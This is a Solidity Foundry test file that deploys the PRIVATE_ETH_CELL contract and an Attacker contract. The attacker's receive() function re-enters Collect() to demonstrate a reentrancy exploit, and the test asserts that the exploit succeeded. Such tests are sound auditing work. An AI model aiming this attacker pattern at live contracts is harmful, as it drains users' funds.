
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {

    PRIVATE_ETH_CELL public cell;

    Attacker public _attacker;
    LogFile public logVictim;

    function setUp() public {
        logVictim = new LogFile();
        cell = new PRIVATE_ETH_CELL();
        cell.SetMinSum(0);
        cell.SetLogFile(address(logVictim));
        cell.Initialized();
        
        _attacker = new Attacker(address(cell));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max);
        
        vm.deal(address(cell), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public reentrantBalance;
    uint256 public attackVal;

    constructor(address victimAddress) { 
        victim = PRIVATE_ETH_CELL(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        reentrantBalance = 0;
        
        attackVal = val;
        
        victim.Deposit{value: 2 * val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));

        victim.Collect(val);

        if (attackCallCount == 2 && reentrantBalance == initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            reentrantBalance = victim.balances(address(this));
            victim.Collect(attackVal);
        }
    }
}
